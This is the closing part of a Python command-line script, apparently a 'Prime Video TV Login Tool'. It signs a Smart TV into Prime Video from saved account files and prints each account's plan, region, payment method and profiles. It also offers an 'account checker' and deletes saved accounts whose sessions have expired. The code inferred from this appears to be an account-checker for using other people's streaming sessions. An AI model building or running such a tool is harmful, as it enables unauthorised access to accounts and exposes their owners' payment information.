                print(Colors.GREEN + Colors.BOLD + "\n" + "=" * 60 + f"\n  🎉 SMART TV LOGIN SUCCESSFUL! 🎬\n  🖥️ Device   : {res.get('device', 'Smart TV')}\n  🔑 TV Code  : {code}\n" + "=" * 60 + Colors.RESET)
                print("Your TV screen is now automatically signed into Prime Video.\nEnjoy streaming! 🍿\n")
                print(Colors.YELLOW + "[*] Fetching account subscription data..." + Colors.RESET)
                det = fetch_subscription_details(cd)
                if det.get("valid"):
                    print(f"  📦 Plan    : {det['plan']}\n  🌐 Region  : {det['country']}")
                    if det.get("payment_method"): print(f"  💳 Payment : {det['payment_method']}")
                    if det.get("profiles"): print(f"  👥 Profiles: {det['profiles']}")
            else:
                print(Colors.RED + Colors.BOLD + "\n" + "=" * 60 + f"\n  ❌ FAILED TO PAIR SMART TV\n  ⚠️ Reason: {res['error']}\n" + "=" * 60 + Colors.RESET)
                if any(k in str(res.get("error", "")).lower() for k in ("session", "expired")):
                    delete_saved_account(sel)
                    print(Colors.YELLOW + f"[*] Deleted expired account: {sel.get('filename')}" + Colors.RESET)
            input("\nPress Enter to return to main menu...")
        elif opt == "2": menu_check_saved_accounts()
        elif opt == "3": menu_run_account_checker()
        elif opt == "4":
            print("Thank you for using Prime Video TV Login Tool.")
            sys.exit(0)

if __name__ == "__main__":
    interactive_cli()
